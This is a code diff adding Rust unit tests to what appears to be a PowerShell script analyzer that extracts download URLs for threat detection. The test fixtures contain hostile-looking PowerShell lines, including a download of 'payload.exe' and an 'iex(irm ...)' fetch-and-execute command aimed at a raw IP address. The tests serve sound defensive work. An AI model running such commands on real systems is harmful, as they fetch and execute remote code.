@@ -8048,6 +8048,58 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_header_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-WebRequest -Headers @{Referer="https://ps-decoy.example/landing"} -Uri https://ps-actual.example/payload.exe -OutFile payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://ps-actual.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "actual IWR URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-decoy.example/landing"
+                )
+            }),
+            "IWR header URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn irm_header_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-RestMethod -Headers @{Origin="https://ps-origin.example"} -Uri https://ps-irm-actual.example/api"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-irm-actual.example/api"
+                )
+            }),
+            "actual IRM URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://ps-origin.example"
+                )
+            }),
+            "IRM header URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn irm_schemeless_ip_url_extracted_as_download() {
         let ps = r#"iex(irm '91.92.34.126:6600' -UseBasicParsing)"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
